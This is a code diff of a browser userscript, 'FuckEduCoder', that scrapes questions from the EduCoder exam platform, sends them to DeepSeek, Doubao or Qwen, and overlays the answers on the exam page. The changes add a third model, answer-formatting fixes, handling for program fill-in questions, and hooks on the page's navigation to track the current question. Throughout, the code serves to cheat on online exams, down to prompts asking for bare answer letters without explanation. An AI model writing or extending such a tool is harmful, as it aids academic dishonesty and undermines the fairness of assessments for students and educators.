+            // 根据题目类型添加特定指导
+            if (question.type === '单选题' || question.type === '多选题') {
+                prompt += '\n请直接给出正确选项字母，不用给出任何解释，直接给出答案以及选项的内容。在回答中明确标记如：选项A(对应的选项内容)正确。不要使用反引号。';
+            } else if (question.type === '判断题') {
+                prompt += '\n请直接给出"正确"或"错误"的判断，不用给出任何解释，直接给出答案以及选项的内容。不要使用反引号。';
+            } else if (question.type === '填空题') {
+                prompt += '\n请直接给出填空的内容，不用给出任何解释，直接给出答案以及选项的内容。不要使用反引号。';
+            }
+
+            // 强调需要包含选项内容
+            if (question.choices && question.choices.length > 0) {
+                prompt += '\n\n重要：请在回答中包含选项内容，例如"选项A(XXXX)正确"，这样用户可以根据选项内容比对网页中的选项。不要使用反引号。';
+            }
         }
 
         return prompt;
@@ -900,14 +1055,19 @@
     // 更新UI显示答案内容的辅助函数
     FuckEduCoder.updateAnswerUI = (answerContainer, answer, question) => {
         if (!answerContainer) return;
-        
+
         // 格式化答案以在HTML中显示
-        const formattedAnswer = answer.replace(/\n\n/g, '<br><br>').replace(/\n/g, '<br>');
+        // 先处理反引号问题，将其替换为HTML实体
+        const formattedAnswer = answer
+            .replace(/`/g, '&#96;')
+            .replace(/\n\n/g, '<br><br>')
+            .replace(/\n/g, '<br>');
+
         answerContainer.innerHTML = `<div class="ai-answer">${formattedAnswer}</div>`;
-        
+
         // 保存答案到问题对象
         question.aiAnswer = answer;
-        
+
         // 更新最小化模式下的答案预览
         const miniAnswerContainer = document.getElementById('mini-answer');
         if (miniAnswerContainer) {
@@ -936,22 +1096,22 @@
         try {
             // 构建提示词
             const prompt = FuckEduCoder.buildPromptForQuestion(question);
-            
+
             // 调用AI模型获取答案
             const aiAnswer = await FuckEduCoder.callAIModel(prompt);
-            
+
             // 更新UI显示答案
             FuckEduCoder.updateAnswerUI(answerContainer, aiAnswer, question);
-        } catch (error) { 
-            console.error('生成答案时出错:', error); 
-            answerContainer.innerHTML = `<em style="color: #f44336;">生成答案失败: ${error.message}</em>`; 
+        } catch (error) {
+            console.error('生成答案时出错:', error);
+            answerContainer.innerHTML = `<em style="color: #f44336;">生成答案失败: ${error.message}</em>`;
         }
     };
 
     FuckEduCoder.displayQuestion = (question, index, total) => {
         const questionContainer = document.getElementById('current-question');
         if (!questionContainer) return;
-        
+
         if (question.type === 'exam-info') { questionContainer.innerHTML = ''; return; }
 
         let html = `
@@ -965,13 +1125,23 @@
         const webPageChoices = FuckEduCoder.getWebPageChoicesOrder(question.questionId);
         if (question.choices && question.choices.length > 0) {
             if (webPageChoices && webPageChoices.length > 0) {
-                webPageChoices.forEach((choice) => { html += `<div class="choice-item">${choice.letter}. ${choice.text}</div>`; });
+                webPageChoices.forEach((choice) => {
+                    html += `<div class="choice-item">${choice.letter}. ${choice.text}</div>`;
+                });
             } else {
                 question.choices.forEach((choice, cIndex) => {
                     const optionLetter = String.fromCharCode(65 + cIndex);
                     html += `<div class="choice-item">${optionLetter}. ${choice.choice_text}</div>`;
                 });
             }
+        }
+
+        // 特殊处理程序填空题
+        if (question.questionType === 8) {
+            // 添加程序填空题标识
+            html += `<div style="margin-top: 10px; color: #ff5722; font-size: 12px; background-color: rgba(255,87,34,.05); padding: 6px; border-radius: 4px;">
+                <strong>程序填空题</strong> (Hack ID: ${question.hackId || '未知'})
+            </div>`;
         }
 
         if (question.code) { html += `<pre class="code-block">${question.code}</pre>`; }
@@ -987,7 +1157,9 @@
                 const webPageSubChoices = FuckEduCoder.getWebPageChoicesOrder(subQuestion.questionId);
                 if (subQuestion.choices && subQuestion.choices.length > 0) {
                     if (webPageSubChoices && webPageSubChoices.length > 0) {
-                        webPageSubChoices.forEach((choice) => { html += `<div class="choice-item">${choice.letter}. ${choice.text}</div>`; });
+                        webPageSubChoices.forEach((choice) => {
+                            html += `<div class="choice-item">${choice.letter}. ${choice.text}</div>`;
+                        });
                     } else {
                         subQuestion.choices.forEach((choice, scIndex) => {
                             const optionLetter = String.fromCharCode(65 + scIndex);
@@ -1038,28 +1210,33 @@
 
         if (localStorage.getItem(CONSTANTS.LOCAL_STORAGE_AUTO_ANSWER) !== 'false') {
             if (question.aiAnswer) {
-                const formattedAnswer = question.aiAnswer.replace(/\n\n/g, '<br><br>').replace(/\n/g, '<br>');
+                // 处理反引号问题，将其替换为HTML实体
+                const formattedAnswer = question.aiAnswer
+                    .replace(/`/g, '&#96;')
+                    .replace(/\n\n/g, '<br><br>')
+                    .replace(/\n/g, '<br>');
+
                 const answerContainer = document.getElementById('ai-answer-content');
                 if (answerContainer) { answerContainer.innerHTML = `<div class="ai-answer">${formattedAnswer}</div>`; }
-                
-                
+
+
                 const miniAnswerContainer = document.getElementById('mini-answer');
                 if (miniAnswerContainer) {
-                    
+
                     let simplifiedAnswer = question.aiAnswer.split('\n')[0];
                     if (simplifiedAnswer.length > 50) {
                         simplifiedAnswer = simplifiedAnswer.substring(0, 50) + '...';
                     }
                     miniAnswerContainer.textContent = `${question.type}: ${simplifiedAnswer}`;
                 }
-            } else { 
-                FuckEduCoder.generateAIAnswer(question); 
+            } else {
+                FuckEduCoder.generateAIAnswer(question);
             }
         } else {
             const answerContainer = document.getElementById('ai-answer-content');
             if (answerContainer) { answerContainer.innerHTML = '<em style="color: #666;">已关闭自动生成答案，点击"刷新答案"按钮获取答案</em>'; }
-            
-            
+
+
             const miniAnswerContainer = document.getElementById('mini-answer');
             if (miniAnswerContainer) {
                 miniAnswerContainer.textContent = `${question.type}: 已关闭自动生成答案`;
@@ -1073,7 +1250,8 @@
 
         const savedDeepseekApiKey = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_DEEPSEEK_API_KEY) || CONSTANTS.DEEPSEEK_DEFAULT_API_KEY;
         const savedDoubaoApiKey = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_DOUBAO_API_KEY) || CONSTANTS.DOUBAO_DEFAULT_API_KEY;
-        const currentAiModel = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_CURRENT_AI_MODEL) || 'deepseek'; 
+        const savedQwenApiKey = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_QWEN_API_KEY) || CONSTANTS.QWEN_DEFAULT_API_KEY;
+        const currentAiModel = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_CURRENT_AI_MODEL) || 'deepseek';
         const autoGenerateAnswers = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_AUTO_ANSWER) !== 'false';
         const disableDeepThinking = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_THINKING_DISABLED) === 'true';
 
@@ -1090,7 +1268,7 @@
 
             <div style="margin-bottom: 15px;">
                 <label style="display: block; margin-bottom: 5px;">选择 AI 模型:</label>
-                <div style="display: flex; gap: 10px;">
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                     <label>
                         <input type="radio" name="ai_model" value="deepseek" id="radio-deepseek" ${currentAiModel === 'deepseek' ? 'checked' : ''}>
                         DeepSeek
@@ -1098,6 +1276,10 @@
                     <label>
                         <input type="radio" name="ai_model" value="doubao" id="radio-doubao" ${currentAiModel === 'doubao' ? 'checked' : ''}>
                         豆包
+                    </label>
+                    <label>
+                        <input type="radio" name="ai_model" value="qwen" id="radio-qwen" ${currentAiModel === 'qwen' ? 'checked' : ''}>
+                        通义千问
                     </label>
                 </div>
             </div>
@@ -1110,6 +1292,11 @@
             <div id="doubao-api-section" style="margin-bottom: 15px; ${currentAiModel === 'doubao' ? '' : 'display: none;'}">
                 <label for="doubao-api-key-input" style="display: block; margin-bottom: 5px;">豆包 API 密钥:</label>
                 <input type="text" id="doubao-api-key-input" value="${savedDoubaoApiKey}" style="width: 100%; padding: 5px; box-sizing: border-box;">
+            </div>
+
+            <div id="qwen-api-section" style="margin-bottom: 15px; ${currentAiModel === 'qwen' ? '' : 'display: none;'}">
+                <label for="qwen-api-key-input" style="display: block; margin-bottom: 5px;">通义千问 API 密钥:</label>
+                <input type="text" id="qwen-api-key-input" value="${savedQwenApiKey}" style="width: 100%; padding: 5px; box-sizing: border-box;">
             </div>
 
             <div style="margin-bottom: 15px;">
@@ -1134,33 +1321,44 @@
 
         const deepseekSection = document.getElementById('deepseek-api-section');
         const doubaoSection = document.getElementById('doubao-api-section');
+        const qwenSection = document.getElementById('qwen-api-section');
         const radioDeepseek = document.getElementById('radio-deepseek');
         const radioDoubao = document.getElementById('radio-doubao');
+        const radioQwen = document.getElementById('radio-qwen');
 
         const updateApiKeyVisibility = () => {
             if (radioDeepseek.checked) {
                 deepseekSection.style.display = '';
                 doubaoSection.style.display = 'none';
+                qwenSection.style.display = 'none';
             } else if (radioDoubao.checked) {
                 deepseekSection.style.display = 'none';
                 doubaoSection.style.display = '';
+                qwenSection.style.display = 'none';
+            } else if (radioQwen.checked) {
+                deepseekSection.style.display = 'none';
+                doubaoSection.style.display = 'none';
+                qwenSection.style.display = '';
             }
         };
 
         radioDeepseek.addEventListener('change', updateApiKeyVisibility);
         radioDoubao.addEventListener('change', updateApiKeyVisibility);
+        radioQwen.addEventListener('change', updateApiKeyVisibility);
 
         document.getElementById('cancel-api-settings').addEventListener('click', () => { document.body.removeChild(modal); });
         document.getElementById('save-api-settings').addEventListener('click', () => {
-            const selectedAiModel = radioDeepseek.checked ? 'deepseek' : 'doubao';
+            const selectedAiModel = radioDeepseek.checked ? 'deepseek' : (radioDoubao.checked ? 'doubao' : 'qwen');
             const deepseekApiKey = document.getElementById('deepseek-api-key-input').value.trim();
             const doubaoApiKey = document.getElementById('doubao-api-key-input').value.trim();
+            const qwenApiKey = document.getElementById('qwen-api-key-input').value.trim();
             const autoGenerate = document.getElementById('auto-generate-checkbox').checked;
             const disableDeepThinking = document.getElementById('disable-deep-thinking-checkbox').checked;
 
             localStorage.setItem(CONSTANTS.LOCAL_STORAGE_CURRENT_AI_MODEL, selectedAiModel);
             localStorage.setItem(CONSTANTS.LOCAL_STORAGE_DEEPSEEK_API_KEY, deepseekApiKey);
             localStorage.setItem(CONSTANTS.LOCAL_STORAGE_DOUBAO_API_KEY, doubaoApiKey);
+            localStorage.setItem(CONSTANTS.LOCAL_STORAGE_QWEN_API_KEY, qwenApiKey);
             localStorage.setItem(CONSTANTS.LOCAL_STORAGE_AUTO_ANSWER, autoGenerate ? 'true' : 'false');
             localStorage.setItem(CONSTANTS.LOCAL_STORAGE_THINKING_DISABLED, disableDeepThinking ? 'true' : 'false');
 
@@ -1169,36 +1367,36 @@
             const toggleBtn = document.getElementById('toggle-auto-answer-btn');
             if (toggleBtn) { toggleBtn.textContent = autoGenerate ? '关闭自动' : '开启自动'; }
 
-            
+
             if (autoGenerate && FuckEduCoder.currentQuestionIndex > 0) {
                 const currentQuestion = FuckEduCoder.allQuestions[FuckEduCoder.currentQuestionIndex];
-                if (currentQuestion) { 
-                    FuckEduCoder.generateAIAnswer(currentQuestion, true); 
+                if (currentQuestion) {
+                    FuckEduCoder.generateAIAnswer(currentQuestion, true);
                 }
             }
         });
     };
 
     FuckEduCoder.makeDraggable = (element, handleElement) => {
-        
+
         let startX, startY, startLeft, startTop, isDragging = false;
-        
+
         const winWidth = window.innerWidth || document.documentElement.clientWidth;
         const winHeight = window.innerHeight || document.documentElement.clientHeight;
         const header = handleElement || element.querySelector('.panel-header');
-        
-        
+
+
         const computedStyle = window.getComputedStyle(element);
         if (computedStyle.position !== 'fixed' && computedStyle.position !== 'absolute' && computedStyle.position !== 'relative') {
             element.style.position = 'fixed';
         }
 
         if (header) {
-            header.style.cursor = 'move'; 
+            header.style.cursor = 'move';
             header.addEventListener('mousedown', dragMouseDown, { passive: false });
             header.addEventListener('touchstart', dragTouchStart, { passive: false });
-            
-            
+
+
             header.addEventListener('dblclick', (e) => {
                 element.style.top = '20px';
                 element.style.right = '20px';
@@ -1210,105 +1408,105 @@
         function dragMouseDown(e) {
             e.preventDefault();
             e.stopPropagation();
-            
-            
+
+
             startX = e.clientX;
             startY = e.clientY;
-            
-            
+
+
             const rect = element.getBoundingClientRect();
             startLeft = rect.left;
             startTop = rect.top;
-            
-            
+
+
             isDragging = true;
             element.classList.add('dragging');
-            
-            
+
+
             document.addEventListener('mousemove', elementDrag, { passive: false });
             document.addEventListener('mouseup', closeDragElement);
-            
+
 
             document.body.style.userSelect = 'none';
         }
-        
+
         function dragTouchStart(e) {
             if (e.touches.length === 1) {
                 e.preventDefault();
                 e.stopPropagation();
-                
+
                 const touch = e.touches[0];
                 startX = touch.clientX;
                 startY = touch.clientY;
-                
+
                 const rect = element.getBoundingClientRect();
                 startLeft = rect.left;
                 startTop = rect.top;
-                
+
                 isDragging = true;
                 element.classList.add('dragging');
-                
+
                 document.addEventListener('touchmove', elementTouchDrag, { passive: false });
                 document.addEventListener('touchend', closeTouchDragElement);
                 document.addEventListener('touchcancel', closeTouchDragElement);
-                    
-                    
+
+
                 document.body.style.userSelect = 'none';
             }
         }
 
         function elementDrag(e) {
             if (!isDragging) return;
-            
+
             e.preventDefault();
             e.stopPropagation();
-            
-            
+
+
             const dx = e.clientX - startX;
             const dy = e.clientY - startY;
-            
-            
+
+
             const elementWidth = element.offsetWidth;
             const elementHeight = element.offsetHeight;
-            
-            
+
+
             let newLeft = startLeft + dx;
             let newTop = startTop + dy;
-            
-            
+
+
             newLeft = Math.max(-elementWidth * 0.25, Math.min(newLeft, winWidth - elementWidth * 0.25));
-            newTop = Math.max(0, Math.min(newTop, winHeight - 40)); 
-            
-            
+            newTop = Math.max(0, Math.min(newTop, winHeight - 40));
+
+
             element.style.left = `${newLeft}px`;
             element.style.top = `${newTop}px`;
-            element.style.right = 'auto'; 
-            element.style.bottom = 'auto'; 
+            element.style.right = 'auto';
+            element.style.bottom = 'auto';
         }
-        
+
         function elementTouchDrag(e) {
             if (!isDragging || e.touches.length !== 1) return;
-            
+
             e.preventDefault();
             e.stopPropagation();
-            
+
             const touch = e.touches[0];
             const dx = touch.clientX - startX;
             const dy = touch.clientY - startY;
-            
-            
+
+
             const elementWidth = element.offsetWidth;
             const elementHeight = element.offsetHeight;
-            
+
             // 计算边界
             let newLeft = startLeft + dx;
             let newTop = startTop + dy;
-            
-            
+
+
             newLeft = Math.max(-elementWidth * 0.25, Math.min(newLeft, winWidth - elementWidth * 0.25));
-            newTop = Math.max(0, Math.min(newTop, winHeight - 40)); 
-            
-            
+            newTop = Math.max(0, Math.min(newTop, winHeight - 40));
+
+
             element.style.left = `${newLeft}px`;
             element.style.top = `${newTop}px`;
             element.style.right = 'auto';
@@ -1321,26 +1519,7 @@
             document.removeEventListener('mousemove', elementDrag);
             document.removeEventListener('mouseup', closeDragElement);
             document.body.style.userSelect = '';
-            
-            
-            try {
-                localStorage.setItem('panel_position', JSON.stringify({
-                    left: element.style.left,
-                    top: element.style.top
-                }));
-            } catch (err) {
-                
-            }
-        }
-        
-        function closeTouchDragElement(e) {
-            isDragging = false;
-            element.classList.remove('dragging');
-            document.removeEventListener('touchmove', elementTouchDrag);
-            document.removeEventListener('touchend', closeTouchDragElement);
-            document.removeEventListener('touchcancel', closeTouchDragElement);
-            document.body.style.userSelect = '';
-            
+
 
             try {
                 localStorage.setItem('panel_position', JSON.stringify({
@@ -1348,11 +1527,30 @@
                     top: element.style.top
                 }));
             } catch (err) {
-                
+
             }
         }
-        
-        
+
+        function closeTouchDragElement(e) {
+            isDragging = false;
+            element.classList.remove('dragging');
+            document.removeEventListener('touchmove', elementTouchDrag);
+            document.removeEventListener('touchend', closeTouchDragElement);
+            document.removeEventListener('touchcancel', closeTouchDragElement);
+            document.body.style.userSelect = '';
+
+
+            try {
+                localStorage.setItem('panel_position', JSON.stringify({
+                    left: element.style.left,
+                    top: element.style.top
+                }));
+            } catch (err) {
+
+            }
+        }
+
+
         try {
             const savedPosition = localStorage.getItem('panel_position');
             if (savedPosition) {
@@ -1365,19 +1563,19 @@
                 }
             }
         } catch (err) {
-            
+
         }
     };
 
     FuckEduCoder.createPanel = () => {
         const panel = document.createElement('div');
         panel.id = 'question-extractor-panel';
-        
-        
+
+
         const viewportWidth = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
         const viewportHeight = Math.max(document.documentElement.clientHeight, window.innerHeight || 0);
-        
-        
+
+
         panel.style.top = '20px';
         panel.style.right = '20px';
         panel.style.position = 'fixed';
@@ -1396,7 +1594,7 @@
                 <div id="status-message">等待题目数据...</div>
                 <div id="exam-info"></div>
                 <div id="current-question"></div>
-                
+
                 <div class="action-buttons">
                     <button class="action-button" id="extract-button">提取题目</button>
                     <button class="action-button" id="copy-button">复制全部</button>
@@ -1408,17 +1606,17 @@
 
         document.body.appendChild(panel);
 
-        document.getElementById('minimize-button').addEventListener('click', () => { 
-            panel.classList.toggle('minimized'); 
-            
-            
+        document.getElementById('minimize-button').addEventListener('click', () => {
+            panel.classList.toggle('minimized');
+
+
             if (panel.classList.contains('minimized')) {
                 const currentQuestion = FuckEduCoder.allQuestions[FuckEduCoder.currentQuestionIndex];
                 const miniAnswerContainer = document.getElementById('mini-answer');
-                
+
                 if (currentQuestion && miniAnswerContainer) {
                     if (currentQuestion.aiAnswer) {
-                        
+
                         let simplifiedAnswer = currentQuestion.aiAnswer.split('\n')[0];
                         if (simplifiedAnswer.length > 50) {
                             simplifiedAnswer = simplifiedAnswer.substring(0, 50) + '...';
@@ -1438,7 +1636,7 @@
         document.getElementById('save-button').addEventListener('click', () => { FuckEduCoder.saveExtractedQuestions(); });
         document.getElementById('api-settings-button').addEventListener('click', () => { FuckEduCoder.showApiSettingsModal(); });
 
-        
+
         const miniAnswerContainer = document.getElementById('mini-answer');
         if (miniAnswerContainer) {
             miniAnswerContainer.addEventListener('click', () => {
@@ -1578,85 +1776,85 @@
             const buttonText = isNext ? '下一题' : '上一题';
             const buttonClass = isNext ? 'next' : 'prev';
             let targetButton = null;
-            
+
             // 方法1：通过特定class查找
             const changeButtons = document.querySelectorAll('.changeButton___sBTjl');
-            for (const btn of changeButtons) { 
-                if (btn.textContent.includes(buttonText)) { 
-                    targetButton = btn; 
-                    break; 
-                } 
+            for (const btn of changeButtons) {
+                if (btn.textContent.includes(buttonText)) {
+                    targetButton = btn;
+                    break;
+                }
             }
-            
+
             // 方法2：通过span查找
             if (!targetButton) {
                 const spans = document.querySelectorAll('span');
                 for (const span of spans) {
                     if (span.textContent.includes(buttonText)) {
-                        let parent = span.parentElement; 
-                        while (parent && parent.tagName.toLowerCase() !== 'button') { 
-                            parent = parent.parentElement; 
+                        let parent = span.parentElement;
+                        while (parent && parent.tagName.toLowerCase() !== 'button') {
+                            parent = parent.parentElement;
                         }
-                        if (parent) { 
-                            targetButton = parent; 
-                            break; 
+                        if (parent) {
+                            targetButton = parent;
+                            break;
                         }
                     }
                 }
             }
-            
+
             // 方法3：直接查找button
             if (!targetButton) {
                 const buttons = document.querySelectorAll('button');
-                for (const btn of buttons) { 
-                    if (btn.textContent.includes(buttonText)) { 
-                        targetButton = btn; 
-                        break; 
-                    } 
+                for (const btn of buttons) {
+                    if (btn.textContent.includes(buttonText)) {
+                        targetButton = btn;
+                        break;
+                    }
                 }
             }
-            
+
             // 方法4：通过class名称模糊查找
             if (!targetButton) {
                 const allElements = document.querySelectorAll('*');
                 for (const el of allElements) {
-                    if (el.className && typeof el.className === 'string' && 
-                        el.className.toLowerCase().includes(buttonClass) && 
-                        el.tagName.toLowerCase() !== 'script' && 
+                    if (el.className && typeof el.className === 'string' &&
+                        el.className.toLowerCase().includes(buttonClass) &&
+                        el.tagName.toLowerCase() !== 'script' &&
                         el.tagName.toLowerCase() !== 'style') {
-                        const style = window.getComputedStyle(el); 
-                        if (style.display !== 'none' && style.visibility !== 'hidden') { 
-                            targetButton = el; 
-                            break; 
+                        const style = window.getComputedStyle(el);
+                        if (style.display !== 'none' && style.visibility !== 'hidden') {
+                            targetButton = el;
+                            break;
                         }
                     }
                 }
             }
-            
+
             // 方法5：最后尝试
             if (!targetButton) {
                 const allClickables = document.querySelectorAll('button, a, [role="button"]');
-                for (const el of allClickables) { 
-                    if (el.textContent.includes(buttonText) && window.getComputedStyle(el).display !== 'none') { 
-                        console.log(`通过遍历找到网页${buttonText}按钮，正在点击`); 
-                        el.click(); 
-                        return true; 
-                    } 
+                for (const el of allClickables) {
+                    if (el.textContent.includes(buttonText) && window.getComputedStyle(el).display !== 'none') {
+                        console.log(`通过遍历找到网页${buttonText}按钮，正在点击`);
+                        el.click();
+                        return true;
+                    }
                 }
-                console.log(`未找到网页${buttonText}按钮`); 
+                console.log(`未找到网页${buttonText}按钮`);
                 return false;
             }
-            
+
             if (targetButton) {
-                console.log(`找到网页${buttonText}按钮，正在点击:`, targetButton); 
-                targetButton.click(); 
+                console.log(`找到网页${buttonText}按钮，正在点击:`, targetButton);
+                targetButton.click();
                 return true;
             }
-            
+
             return false;
-        } catch (error) { 
-            console.error(`点击网页${isNext ? '下一题' : '上一题'}按钮时出错:`, error); 
-            return false; 
+        } catch (error) {
+            console.error(`点击网页${isNext ? '下一题' : '上一题'}按钮时出错:`, error);
+            return false;
         }
     };
 
@@ -1689,23 +1887,23 @@
     FuckEduCoder.listenToWebPageNavigation = () => {
         const originalPushState = history.pushState;
         const originalReplaceState = history.replaceState;
-        
+
         history.pushState = function() {
             originalPushState.apply(this, arguments);
-            
+
             setTimeout(() => {
                 FuckEduCoder.checkContentChange();
             }, 500);
         };
-        
+
         history.replaceState = function() {
             originalReplaceState.apply(this, arguments);
-            
+
             setTimeout(() => {
                 FuckEduCoder.checkContentChange();
             }, 500);
         };
-        
+
         window.addEventListener('popstate', () => {
             setTimeout(() => {
                 FuckEduCoder.checkContentChange();
@@ -1717,7 +1915,7 @@
         const potentialButtons = [];
 
         const selectors = [
-            '.changeButton___sBTjl', 
+            '.changeButton___sBTjl',
             'button',
             'a[role="button"]',
             '[role="button"]',
@@ -1728,7 +1926,7 @@
 
         selectors.forEach(selector => {
             document.querySelectorAll(selector).forEach(el => {
-                if (!el.__navListenerAttached) { 
+                if (!el.__navListenerAttached) {
                     if (el.textContent.includes('下一题') || el.textContent.includes('上一题') ||
                         (el.className && typeof el.className === 'string' &&
                          (el.className.toLowerCase().includes('next') || el.className.toLowerCase().includes('prev')))) {
@@ -1765,7 +1963,7 @@
 
                             }
                         }
-                    }, 300); 
+                    }, 300);
                 });
 
 
@@ -1776,15 +1974,15 @@
     FuckEduCoder.attachListenersToQuestionNumbers = () => {
         try {
             const selectors = [
-                '.answerSheetItem___DIH2V', 
-                '.qindex___XuKA8',          
+                '.answerSheetItem___DIH2V',
+                '.qindex___XuKA8',
                 '.question-number',
                 '.q-index',
                 '.question-index',
                 '.questionIndex',
-                '[class*="answerSheet"]',   
-                '[class*="questionIndex"]', 
-                '[class*="qindex"]'         
+                '[class*="answerSheet"]',
+                '[class*="questionIndex"]',
+                '[class*="qindex"]'
             ];
 
             const questionNumberElements = [];
@@ -1836,11 +2034,12 @@
                             let questionType = null;
 
                             let parentElement = element.parentElement;
-                            const maxSearchDepth = 5; 
+                            const maxSearchDepth = 5;
                             let currentDepth = 0;
 
                             while (parentElement && currentDepth < maxSearchDepth) {
-                                const typeLabels = ['简答题', '单选题', '多选题', '判断题', '填空题', '程序题', '编程题'];
+                                // 扩展题型标签列表，包括可能的程序填空题标签
+                                const typeLabels = ['简答题', '单选题', '多选题', '判断题', '填空题', '程序题', '编程题', '程序填空题'];
 
                                 const elementText = parentElement.textContent || '';
                                 const foundType = typeLabels.find(label => elementText.includes(label));
@@ -1861,8 +2060,9 @@
                                 let minDistance = Infinity;
 
                                 typeElements.forEach(typeEl => {
+                                    // 扩展题型标签列表，包括可能的程序填空题标签
                                     const typeText = typeEl.textContent || '';
-                                    const containsType = ['简答题', '单选题', '多选题', '判断题', '填空题', '程序题', '编程题'].some(t => typeText.includes(t));
+                                    const containsType = ['简答题', '单选题', '多选题', '判断题', '填空题', '程序题', '编程题', '程序填空题'].some(t => typeText.includes(t));
 
                                     if (containsType) {
                                         const rect1 = element.getBoundingClientRect();
@@ -1881,7 +2081,7 @@
 
                                 if (closestTypeElement) {
                                     const typeText = closestTypeElement.textContent;
-                                    const typeMatch = typeText.match(/(简答题|单选题|多选题|判断题|填空题|程序题|编程题)/);
+                                    const typeMatch = typeText.match(/(简答题|单选题|多选题|判断题|填空题|程序题|编程题|程序填空题)/);
                                     if (typeMatch) {
                                         questionType = typeMatch[1];
                                         console.log(`通过距离找到题型: ${questionType}`);
@@ -1889,7 +2089,82 @@
                                 }
                             }
 
-                            if (!questionType) {
+                            // 如果找到了题型，尝试查找对应题目
+                            if (questionType) {
+                                let matchedIndex = -1;
+                                let typeQuestionCounter = 0;
+
+                                // 添加调试日志
+                                console.log(`尝试查找题型"${questionType}"下的第${questionNumber}题`);
+
+                                // 记录所有题目的类型信息，帮助调试
+                                console.log('所有题目类型信息:');
+                                for (let i = 1; i < FuckEduCoder.allQuestions.length; i++) {
+                                    console.log(`索引 ${i}: 类型=${FuckEduCoder.allQuestions[i].type}, 原始类型=${FuckEduCoder.allQuestions[i].questionType}, 标题=${FuckEduCoder.allQuestions[i].title.substring(0, 30)}...`);
+                                }
+
+                                // 尝试直接匹配程序填空题
+                                if (questionType.includes('程序') || questionType.includes('填空')) {
+                                    console.log('尝试直接匹配程序填空题');
+                                    for (let i = 1; i < FuckEduCoder.allQuestions.length; i++) {
+                                        // 对于程序填空题，直接检查questionType === 8
+                                        if (FuckEduCoder.allQuestions[i].questionType === 8) {
+                                            typeQuestionCounter++;
+                                            console.log(`  找到程序填空题, 计数器=${typeQuestionCounter}, 目标=${questionNumber}`);
+                                            if (typeQuestionCounter === questionNumber) {
+                                                matchedIndex = i;
+                                                console.log(`  ✓ 找到程序填空题匹配! 索引=${matchedIndex}`);
+                                                break;
+                                            }
+                                        }
+                                    }
+                                }
+
+                                // 如果没找到，尝试常规匹配
+                                if (matchedIndex === -1) {
+                                    console.log('尝试常规题型匹配');
+                                    typeQuestionCounter = 0;
+                                    for (let i = 1; i < FuckEduCoder.allQuestions.length; i++) {
+                                        // 检查题目类型是否匹配
+                                        const isTypeMatch = FuckEduCoder.allQuestions[i].type === questionType ||
+                                            // 特殊处理程序填空题
+                                            (questionType.includes('程序') && FuckEduCoder.allQuestions[i].questionType === 8) ||
+                                            (questionType.includes('填空') && FuckEduCoder.allQuestions[i].questionType === 8);
+
+                                        // 记录每个题目的匹配情况
+                                        console.log(`索引 ${i} 匹配情况: isTypeMatch=${isTypeMatch}, 类型=${FuckEduCoder.allQuestions[i].type}, 查找类型=${questionType}`);
+
+                                        if (isTypeMatch) {
+                                            typeQuestionCounter++;
+                                            console.log(`  找到匹配题型, 计数器=${typeQuestionCounter}, 目标=${questionNumber}`);
+                                            if (typeQuestionCounter === questionNumber) {
+                                                matchedIndex = i;
+                                                console.log(`  ✓ 找到完全匹配! 索引=${matchedIndex}`);
+                                                break;
+                                            }
+                                        }
+                                    }
+                                }
+
+                                if (matchedIndex !== -1) {
+                                    console.log(`找到题型"${questionType}"下的第${questionNumber}题，索引: ${matchedIndex}`);
+                                    setTimeout(() => {
+                                        FuckEduCoder.currentQuestionIndex = matchedIndex;
+                                        FuckEduCoder.displayQuestion(
+                                            FuckEduCoder.allQuestions[matchedIndex],
+                                            matchedIndex,
+                                            FuckEduCoder.allQuestions.length
+                                        );
+                                    }, 300);
+                                    return;
+                                } else {
+                                    console.log(`未能找到题型"${questionType}"下的第${questionNumber}题`);
+                                }
+                            }
+
+                            // 如果通过题型匹配失败，尝试其他方法
+                            if (!questionType || matchedIndex === -1) {
+                                // 尝试通过分组方式匹配
                                 const allNumberButtons = Array.from(document.querySelectorAll(selectors.join(', ')))
                                     .filter(el => {
                                         const btnText = el.textContent.trim();
@@ -1899,7 +2174,7 @@
                                 const groupedByY = {};
                                 allNumberButtons.forEach(btn => {
                                     const rect = btn.getBoundingClientRect();
-                                    const y = Math.round(rect.top / 50) * 50; 
+                                    const y = Math.round(rect.top / 50) * 50;
                                     if (!groupedByY[y]) groupedByY[y] = [];
                                     groupedByY[y].push(btn);
                                 });
@@ -1913,7 +2188,7 @@
                                     const indexInGroup = elementGroup.indexOf(element);
 
                                     if (groupIndex >= 0 && indexInGroup >= 0) {
-                                        const realIndex = indexInGroup + 1; 
+                                        const realIndex = indexInGroup + 1;
 
                                         let currentTypeIndex = -1;
                                         let currentTypeCounter = 0;
@@ -1951,48 +2226,21 @@
                                         }
                                     }
                                 }
-                            }
 
-                            if (questionType) {
-                                let matchedIndex = -1;
-                                let typeQuestionCounter = 0;
+                                // 最后尝试直接题号匹配
+                                console.log(`未能通过题型匹配，回退到直接题号匹配: ${questionNumber}`);
+                                const targetIndex = questionNumber;
 
-                                for (let i = 1; i < FuckEduCoder.allQuestions.length; i++) {
-                                    if (FuckEduCoder.allQuestions[i].type === questionType) {
-                                        typeQuestionCounter++;
-                                        if (typeQuestionCounter === questionNumber) {
-                                            matchedIndex = i;
-                                            break;
-                                        }
-                                    }
-                                }
-
-                                if (matchedIndex !== -1) {
-                                    console.log(`找到题型"${questionType}"下的第${questionNumber}题，索引: ${matchedIndex}`);
+                                if (targetIndex >= 1 && targetIndex < FuckEduCoder.allQuestions.length) {
                                     setTimeout(() => {
-                                        FuckEduCoder.currentQuestionIndex = matchedIndex;
+                                        FuckEduCoder.currentQuestionIndex = targetIndex;
                                         FuckEduCoder.displayQuestion(
-                                            FuckEduCoder.allQuestions[matchedIndex],
-                                            matchedIndex,
+                                            FuckEduCoder.allQuestions[targetIndex],
+                                            targetIndex,
                                             FuckEduCoder.allQuestions.length
                                         );
                                     }, 300);
-                                    return;
                                 }
-                            }
-
-                            console.log(`未能通过题型匹配，回退到直接题号匹配: ${questionNumber}`);
-                            const targetIndex = questionNumber;
-
-                            if (targetIndex >= 1 && targetIndex < FuckEduCoder.allQuestions.length) {
-                                setTimeout(() => {
